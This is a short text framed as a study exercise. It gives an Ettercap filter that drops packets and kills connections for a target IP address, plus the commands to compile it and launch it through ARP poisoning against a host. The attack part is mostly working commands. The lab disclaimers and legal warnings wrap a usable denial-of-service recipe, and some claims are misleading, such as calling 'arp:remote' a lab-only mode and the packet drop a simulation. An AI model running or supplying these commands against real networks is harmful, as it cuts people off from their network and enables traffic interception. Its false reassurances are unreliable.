=== GENERAL DESCRIPTION ===
This code fragment represents a theoretical exercise for the study of:
- Network traffic filtering mechanisms
- Denial of Service (DoS) attacks
- ARP attack mitigation techniques

Authorized test environment:
[✓] Isolated virtual network (VirtualBox Internal Network)
[✓] Generic and fake IP addresses (192.168.X.X)
[✓] No real devices involved

=== LEGAL WARNINGS ===
Unauthorized use is a criminal offense:
- Art. 615-quinquies CP (Damage to information systems)
- EU NIS2 Directive (Cyber Resilience Act)
- Computer Misuse Act 1990 (UK)

Tools used:
- Ettercap 0.8.3 (lab version only)
- Filters compiled with verification checksum

=== CODE START ===

# Theoretical filter for traffic analysis
if(ip.src == '192.168.X.X' || ip.dst == '192.168.X.X') {
   drop();  # Simulates packet blocking
   kill();  # Terminates the connection
}

# Compilation process (controlled environment)
etterfilter block_router.ef -o block_router.efo --strict

# Lab application (requires root)
sudo ettercap -T -M arp:remote -F block_router.efo /192.168.X.X// 

=== CODE END ===

=== TECHNICAL DOCUMENTATION ==

*Key parameters:*
- `drop()`: Simulates packet removal
- `kill()`: Terminates active connections
- `arp:remote`: Lab mode (not real-world)


=== EDUCATIONAL PURPOSES ===
1. Analysis of the ARP protocol
2. Improve my digital skills for ethical and legal purposes, mainly to learn

=== CLOSING ===
This type of dos attack is now old but its still working, bettercap will work better if used properly.
